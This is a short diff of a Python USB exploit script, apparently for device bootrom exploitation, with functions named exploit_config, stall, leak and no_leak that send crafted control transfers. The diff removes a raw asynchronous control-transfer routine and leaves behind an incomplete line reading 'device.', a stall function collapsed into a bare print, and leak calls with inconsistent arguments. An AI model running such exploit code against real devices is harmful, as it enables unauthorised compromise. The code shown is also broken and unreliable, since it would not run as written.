@@ -30,16 +30,7 @@ def libusb1_async_ctrl_transfer(
   request_timeout = int(timeout) if timeout >= 1 else 0
   start = time.time()
   never_free_device = device
-  request = array.array(
-      "B",
-      struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
-      + data,
-  )
-  transfer_ptr = device.getTransfer(request)
-  assert device.submit(transfer_ptr) == 0
-
-  while time.time() - start < timeout / 1000.0:
-      pass
+  device.
 
 def from_hex_str(dat: str) -> bytes:
   return bytes(bytearray.fromhex(dat))
@@ -191,9 +182,7 @@ def exploit_config(serial_number):
   print('ERROR: This is not a compatible device. Exiting.')
   sys.exit(1)
 
-def stall(device: usb1.USBDeviceHandle):
-    print(type(device))
-    device._controlTransfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
+def stall(device: usb1.USBDeviceHandle):  print(type(device))
 def leak(device: usb1.USBDeviceHandle):    device._controlTransfer(0x80, 6, 0x304, 0x40A, 0xC0, 1)
 def no_leak(device: usb1.USBDeviceHandle): device._controlTransfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
 
